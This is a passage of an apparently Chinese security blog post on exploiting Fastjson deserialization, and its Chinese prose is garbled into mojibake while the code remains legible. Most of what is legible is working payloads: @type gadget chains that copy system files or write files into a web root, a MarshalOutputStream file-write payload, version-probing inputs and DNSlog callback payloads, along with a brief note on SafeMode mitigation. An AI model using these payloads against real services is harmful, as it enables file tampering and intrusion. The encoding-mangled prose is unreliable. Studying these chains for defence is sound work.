æ–¹æ³•<br>ä»¥ä¸Šä¸‰ä¸ªç»„åˆåœ¨ä¸€èµ·å°±èƒ½æ„é€ æˆä¸€ä¸ªå†™æ–‡ä»¶çš„åˆ©ç”¨é“¾ï¼Œæˆ‘é€šè¿‡æ‰«æäº†ä¸€ä¸‹ JDK ï¼Œæ‰¾åˆ°äº†ç¬¦åˆç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªæ¡ä»¶çš„ç±»ã€‚<br></code></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯ä¸€äº›åˆ©ç”¨payload</p><p><strong>å¤åˆ¶æ–‡ä»¶</strong></p><p>åˆ©ç”¨ç±»ï¼š<strong>org.eclipse.core.internal.localstore.SafeFileOutputStream</strong></p><p>åˆ©ç”¨ä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.aspectj<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aspectjtools<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å»çœ‹ä¸€ä¸‹SafeFileOutputStreamçš„æºç ï¼š</p><p><img src="https://cdn.clown2024.cn/202409031659197.png" alt="image-20240903165946075"></p><p>è¯¥æ„é€ å‡½æ•°åˆ¤æ–­å¦‚æœtargetPathæ–‡ä»¶ä¸å­˜åœ¨ä¸”tempPathæ–‡ä»¶å­˜åœ¨ï¼Œå°±ä¼šæŠŠtempPathå¤åˆ¶åˆ°targetPathä¸­</p><p>åˆ©ç”¨PoCï¼š</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;tempPath&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;C:/Windows/win.ini&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;targetPath&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;D:/win.txt&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.File_Use;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">File_Move</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;, \&quot;@type\&quot;:\&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;, \&quot;tempPath\&quot;:\&quot;C:/Windows/win.ini\&quot;, \&quot;targetPath\&quot;:\&quot;D:/win.txt\&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409031704660.png" alt="image-20240903170451492"></p><p><strong>æ–‡ä»¶å†™å…¥</strong></p><p>å†™å†…å®¹ç±»ï¼š<strong>com.esotericsoftware.kryo.io.Output</strong></p><p>ä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.esotericsoftware<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>kryo<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Outputç±»ä¸»è¦ç”¨æ¥å†™å†…å®¹ï¼Œå®ƒæä¾›äº†setBuffer()å’ŒsetOutputStream()ä¸¤ä¸ªsetteræ–¹æ³•å¯ä»¥ç”¨æ¥å†™å…¥è¾“å…¥æµï¼Œå…¶ä¸­bufferå‚æ•°å€¼æ˜¯æ–‡ä»¶å†…å®¹ï¼ŒoutputStreamå‚æ•°å€¼å°±æ˜¯å‰é¢çš„SafeFileOutputStreamç±»å¯¹è±¡ï¼Œè€Œè¦è§¦å‘å†™æ–‡ä»¶æ“ä½œåˆ™éœ€è¦è°ƒç”¨å…¶flush()å‡½æ•°</p><p>çœ‹ä¸€ä¸‹Outputç±»çš„æºç </p><p><img src="https://cdn.clown2024.cn/202409031911793.png" alt="image-20240903191151647"></p><p><img src="https://cdn.clown2024.cn/202409031915040.png" alt="image-20240903191539933"></p><p><img src="https://cdn.clown2024.cn/202409031913515.png" alt="image-20240903191344410"></p><p>æ‰€ä»¥æˆ‘ä»¬è¦æƒ³åŠæ³•è°ƒç”¨åˆ°Outputçš„flushå‡½æ•°</p><p>flushå‡½æ•°å¯ä»¥åœ¨è°ƒç”¨closeå‡½æ•°å’Œrequireå‡½æ•°æ—¶è§¦å‘</p><p><img src="https://cdn.clown2024.cn/202409032015641.png" alt="image-20240903201552519"></p><p><img src="https://cdn.clown2024.cn/202409032015969.png" alt="image-20240903201535860"></p><p>ç„¶årequireå‡½æ•°åœ¨writeç›¸å…³å‡½æ•°è§¦å‘</p><p><img src="https://cdn.clown2024.cn/202409032016029.png" alt="image-20240903201620928"></p><p><img src="https://cdn.clown2024.cn/202409032017695.png" alt="image-20240903201703586"></p><p>ç„¶åæ‰¾åˆ°JDKçš„ObjectOutputStreamç±»ï¼Œå…¶å†…éƒ¨ç±»BlockDataOutputStreamçš„æ„é€ å‡½æ•°ä¸­å°†OutputStreamç±»å‹å‚æ•°èµ‹å€¼ç»™outæˆå‘˜å˜é‡ï¼Œè€Œå…¶setBlockDataMode()å‡½æ•°ä¸­è°ƒç”¨äº†drain()å‡½æ•°ã€drain()å‡½æ•°ä¸­åˆè°ƒç”¨äº†out.write()å‡½æ•°ï¼Œæ»¡è¶³å‰é¢çš„éœ€æ±‚</p><blockquote><p>è¿™éƒ½å’‹æ‰¾çš„å•ŠğŸ˜¢</p></blockquote><p><img src="https://cdn.clown2024.cn/202409032020430.png" alt="image-20240903202010304"></p><p><img src="https://cdn.clown2024.cn/202409032020708.png" alt="image-20240903202044589"></p><p>ç„¶åå¯¹äºsetBlockDataMode()å‡½æ•°çš„è°ƒç”¨ï¼Œåœ¨ObjectOutputStreamç±»çš„æœ‰å‚æ„é€ å‡½æ•°ä¸­å°±å­˜åœ¨</p><p><img src="https://cdn.clown2024.cn/202409032023421.png" alt="image-20240903202324306"></p><p>ä½†æ˜¯Fastjsonä¼˜å…ˆè·å–çš„æ˜¯ObjectOutputStreamç±»çš„æ— å‚æ„é€ å‡½æ•°ï¼Œå› æ­¤åªèƒ½æ‰¾ObjectOutputStreamçš„ç»§æ‰¿ç±»æ¥è§¦å‘ï¼Œç„¶åæ‰¾åˆ°åªæœ‰æœ‰å‚æ„é€ å‡½æ•°çš„ObjectOutputStreamç»§æ‰¿ç±»ï¼š<strong>com.sleepycat.bind.serial.SerialOutput</strong>ï¼Œè¿™ä¸ªç±»åœ¨è¿™ä¸ªä¾èµ–é‡Œé¢</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.sleepycat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>je<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.0.73<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409032027918.png" alt="image-20240903202720784"></p><p>ç„¶åè¿™é‡Œè°ƒç”¨äº†çˆ¶ç±»çš„æ„é€ æ–¹æ³•ï¼Œåˆ°è¿™é‡Œæœ€ç»ˆæ»¡è¶³æ¡ä»¶</p><p>pocå¦‚ä¸‹ï¼Œç„¶åä¹Ÿè¿ç”¨äº†å‰é¢çš„å¾ªç¯å¼•ç”¨æŠ€å·§</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;stream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;targetPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;D:/wamp64/www/hacked.txt&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;tempPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;D:/wamp64/www/test.txt&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.esotericsoftware.kryo.io.Output&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;buffer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cHduZWQ=&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;outputStream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.stream&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;position&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;close&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sleepycat.bind.serial.SerialOutput&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.writer&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯å†™å…¥æ–‡ä»¶æœ‰é™ï¼Œæœ‰äº›ç‰¹æ®Šå­—ç¬¦å†™ä¸äº†ï¼Œæ¯”å¦‚phpä»£ç </p><blockquote><p>payloadç›´æ¥æŠ„äº†ï¼Œæ€ä¹ˆå†™å‡ºæ¥çš„å°±ä¸ç®¡äº†ï¼ˆ</p></blockquote><p>ä»£ç ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.File_Use;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">File_Write</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String payload=<span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;stream\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;targetPath\&quot;: \&quot;D:/hacked.txt\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;tempPath\&quot;: \&quot;\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;writer\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;com.esotericsoftware.kryo.io.Output\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;buffer\&quot;: \&quot;cHduZWQ=\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;outputStream\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            \&quot;$ref\&quot;: \&quot;$.stream\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;position\&quot;: 5\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;close\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;com.sleepycat.bind.serial.SerialOutput\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;out\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            \&quot;$ref\&quot;: \&quot;$.writer\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409032034460.png" alt="image-20240903203402350"></p><p>buffè¿™é‡Œä¼ çš„æ˜¯base64ä¹‹åçš„æ•°æ®</p><p>è¿™é‡Œè¿˜çœ‹åˆ°å¦ä¸€ç§å†™æ–‡ä»¶çš„payload</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    &#x27;@type&#x27;<span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>    &#x27;@type&#x27;<span class="hljs-punctuation">:</span>&#x27;sun.rmi.server.MarshalOutputStream&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;out&#x27;<span class="hljs-punctuation">:</span><br>    <span class="hljs-punctuation">&#123;</span><br>        &#x27;@type&#x27;<span class="hljs-punctuation">:</span>&#x27;java.util.zip.InflaterOutputStream&#x27;<span class="hljs-punctuation">,</span><br>        &#x27;out&#x27;<span class="hljs-punctuation">:</span><br>        <span class="hljs-punctuation">&#123;</span><br>           &#x27;@type&#x27;<span class="hljs-punctuation">:</span>&#x27;java.io.FileOutputStream&#x27;<span class="hljs-punctuation">,</span><br>           &#x27;file&#x27;<span class="hljs-punctuation">:</span>&#x27;dst&#x27;<span class="hljs-punctuation">,</span><br>           &#x27;append&#x27;<span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        &#x27;infl&#x27;<span class="hljs-punctuation">:</span><br>        <span class="hljs-punctuation">&#123;</span><br>            &#x27;input&#x27;<span class="hljs-punctuation">:</span>&#x27;ä½ çš„å†…å®¹çš„base64ç¼–ç &#x27;<br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        &#x27;bufLen&#x27;<span class="hljs-punctuation">:</span><span class="hljs-number">1048576</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    &#x27;protocolVersion&#x27;<span class="hljs-punctuation">:</span><span class="hljs-number">1</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>è¡¥ä¸åˆ†æ</strong></p><p>é¢é¢é¢è¯¥ç‰ˆæœ¬ä¹‹åçš„è¡¥ä¸åˆæ˜¯ç²—æš´çš„ç»™expectClasså¤šåŠ ä¸Šä¸€äº›é»‘åå•</p><h2 id="safemode"><a href="#SafeMode" class="headerlink" title="SafeMode"></a>SafeMode</h2><p>åœ¨1.2.68ä¹‹åçš„ç‰ˆæœ¬ï¼Œåœ¨1.2.68ç‰ˆæœ¬ä¸­ï¼Œfastjsonå¢åŠ äº†safeModeçš„æ”¯æŒã€‚safeModeæ‰“å¼€åï¼Œå®Œå…¨ç¦ç”¨autoTypeã€‚</p><p>å¼€å¯å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setSafeMode(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p>å¼€å¯ä¹‹åç›´æ¥å®Œå…¨ç¦ç”¨autoTypeï¼Œå³@type</p><p><img src="https://cdn.clown2024.cn/202409032040917.png" alt="image-20240903204034792"></p><p>è·å–æ˜¯å¦è®¾ç½®äº†SafeModeï¼Œå¦‚æœæ˜¯åˆ™ç›´æ¥æŠ›å‡ºå¼‚å¸¸ç»ˆæ­¢è¿è¡Œ</p><h1 id="fastjson1280"><a href="#Fastjson1-2-80" class="headerlink" title="Fastjson1.2.80"></a>Fastjson1.2.80</h1><p>1.2.68ä¹‹åæ–°ç‰ˆæœ¬å°†<code>java.lang.Runnableã€java.lang.Readableå’Œjava.lang.AutoCloseable</code>åŠ å…¥äº†é»‘åå•ï¼Œè¿™é‡Œå°±åˆ©ç”¨å¦ä¸€ä¸ªæœŸæœ›ç±»ï¼Œå¼‚å¸¸ç±»<code>Throwable</code></p><p>è¿™é‡Œå°±çœ‹ä¸€ä¸‹è¿™ç¯‡æ–‡ç« å°±è¡Œäº†ï¼š<a href="https://mp.weixin.qq.com/s/EXnXCy5NoGIgpFjRGfL3wQ%EF%BC%8C%E5%9B%A0%E4%B8%BA%E7%9C%8B%E8%B5%B7%E6%9D%A5%E5%BE%88%E9%9A%BE%E6%9C%89rce%E7%9A%84%E7%82%B9%EF%BC%88%E4%B8%BB%E8%A6%81%E6%98%AF%E6%87%92%E4%BA%86%E4%B8%8D%E6%83%B3%E5%86%8D%E5%86%99%E4%BA%86%F0%9F%98%A2">https://mp.weixin.qq.com/s/EXnXCy5NoGIgpFjRGfL3wQï¼Œå› ä¸ºçœ‹èµ·æ¥å¾ˆéš¾æœ‰rceçš„ç‚¹ï¼ˆä¸»è¦æ˜¯æ‡’äº†ä¸æƒ³å†å†™äº†ğŸ˜¢</a></p><h1 id="ä¿¡æ¯æ¢æµ‹"><a href="#ä¿¡æ¯æ¢æµ‹" class="headerlink" title="ä¿¡æ¯æ¢æµ‹"></a>ä¿¡æ¯æ¢æµ‹</h1><p>å¹³æ—¶ç”¨äºæ¢æµ‹fastjsonçš„ä¸€äº›ä¿¡æ¯æ¥è€ƒè™‘å¦‚ä½•åˆ©ç”¨ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://forum.butian.net/share/2858%EF%BC%8Chttps://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Improvement">https://forum.butian.net/share/2858ï¼Œhttps://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Improvement</a></p><p>ç„¶åä½¿ç”¨safe6Secå¸ˆå‚…çš„å¤ç°ç¯å¢ƒæ¥åšæµ‹è¯•ï¼š<a href="https://github.com/safe6Sec/ShiroAndFastJson">https://github.com/safe6Sec/ShiroAndFastJson</a></p><p>å°†å…¶ä¸­&#x2F;jsonè·¯ç”±çš„ä»£ç ä¿®æ”¹ä¸€ä¸‹æ–¹ä¾¿æŸ¥çœ‹è§£æç»“æœæˆ–è€…è§£ææŠ¥é”™ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@PostMapping(&quot;/json&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title function_">parse</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String data)</span> &#123;<br>    <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>    <span class="hljs-keyword">try</span> &#123;<br>        jsonObject.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-number">0</span>);<br>        jsonObject.put(<span class="hljs-string">&quot;message&quot;</span>, String.valueOf(JSON.parse(data)));<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        jsonObject.put(<span class="hljs-string">&quot;status&quot;</span>, -<span class="hljs-number">1</span>);<br>        jsonObject.put(<span class="hljs-string">&quot;error&quot;</span>, e.getMessage());<br>    &#125;<br>    <span class="hljs-keyword">return</span> jsonObject;<br>&#125;<br></code></pre></td></tr></table></figure><p>åé¢ç›´æ¥å‘&#x2F;jsonè·¯ç”±è¿›è¡Œpostè¯·æ±‚å³å¯</p><h2 id="ç‰ˆæœ¬æ¢æµ‹"><a href="#ç‰ˆæœ¬æ¢æµ‹" class="headerlink" title="ç‰ˆæœ¬æ¢æµ‹"></a>ç‰ˆæœ¬æ¢æµ‹</h2><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Improvement">https://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Improvement</a></p><p><strong>å…·ä½“ç‰ˆæœ¬æ¢æµ‹</strong></p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://b1ue.cn/archives/402.html">https://b1ue.cn/archives/402.html</a></p><p>å…·ä½“åŸç†æ˜¯JavaBeanDeserializer ç±»å¼‚å¸¸çš„ message ä¼šæŠŠå½“å‰ fastjson çš„ç‰ˆæœ¬å·è¾“å‡ºï¼Œæ‰€ä»¥éœ€è¦æ„é€ å‡ºèƒ½ä»¤è¿™ä¸ªç±»æŠ›å‡ºå¼‚å¸¸çš„é”™è¯¯å³å¯</p><p><img src="https://cdn.clown2024.cn/202409052248218.png" alt="image-20240905224846071"></p><p>è¿™é‡Œç›´æ¥åˆ—å‡ºæ–‡ç« éœ€è¦æ»¡è¶³çš„æŠ¥é”™æ¡ä»¶ï¼š</p><ul><li>å½“ä»£ç ä½¿ç”¨ <code>JSON.parseObject(json , clazz)</code> æŒ‡å®šæœŸæœ›ç±»çš„æ–¹å¼å»è§£æ JSONï¼Œä¸” clazz ä¸èƒ½ä¸º fastjson å·²è®¾å®šçš„å¤§éƒ¨åˆ†ç±»å‹ï¼Œå¦‚â€œHashmapâ€ã€â€œArrayListâ€</li><li>å½“ä½¿ç”¨ <code>JSON.parse(json)</code> ä¸æŒ‡å®šæœŸæœ›ç±»çš„æ—¶å€™å¯ä»¥é€šè¿‡ AutoCloseable æ¥è§¦å‘</li></ul><p>æ¯”å¦‚è¿™æ ·ï¼š</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>   <span class="hljs-comment">//è¯¥æ–¹æ³•å°è¯•äº†ä¸€ä¸‹ç›´åˆ°1.2.80éƒ½è¿˜å¯ä»¥æ¢æµ‹å‡º</span><br> <br><span class="hljs-comment">//ä¸‹é¢è¿™ä¸ªæ®è¯´ä¹Ÿèƒ½æ¢æµ‹ï¼Œä½†æ˜¯è¯¥é¶åœºæ²¡æœ‰æˆåŠŸ</span><br><span class="hljs-punctuation">[</span><span class="hljs-attr">&quot;test&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409052252040.png" alt="image-20240905225213882"></p><p><strong>æ¢æµ‹DNS</strong></p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/why811/article/details/133679673">https://blog.csdn.net/why811/article/details/133679673</a></p><p>DNSæ¢æµ‹ä¸»è¦æ˜¯ä¸ºäº†æ¢æµ‹æ˜¯å¦ä¸ºfastjson</p><p>è¿™é‡Œdnslogå¯ä»¥ç›´æ¥ç”¨yakitç”Ÿæˆ</p><p><img src="https://cdn.clown2024.cn/202409051322413.png" alt="image-20240905132158243"></p><p>è¿™é‡Œçº¯æ”¶é›†payloadå¤ç°äº†ï¼Œæ²¡æ‰¾åˆ°ä»€ä¹ˆåˆ†æçš„æ–‡ç« </p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.InetAddress&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;muwoiavfqk.dgrh3.cn&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><blockquote><p>ä¸è¿‡è¿™ä¸ªgadgetåœ¨1.2.48ç¦æ­¢äº†</p></blockquote><p>1.2.68ç‰ˆæœ¬ç»“æœ</p><p><img src="https://cdn.clown2024.cn/202409051325045.png" alt="image-20240905132543897"></p><p>ç¬‘æ­»yakitçš„dnslogæ²¡è®°å½•å‡ºæ¥ï¼Œdnslogå¹³å°çš„å¯ä»¥</p><p><img src="https://cdn.clown2024.cn/202409051337491.png" alt="image-20240905133750354"></p><p><img src="https://cdn.clown2024.cn/202409051337590.png" alt="image-20240905133730460"></p><p>å„ç§payload</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet4Address&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet6Address&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-comment">//ä¸‹é¢æ˜¯ä¸€äº›ç•¸å½¢payloadï¼Œä¼šæŠ¥é”™ä½†æ˜¯ä¹Ÿèƒ½è§¦å‘dnslog</span><br><span class="hljs-punctuation">&#123;</span><span 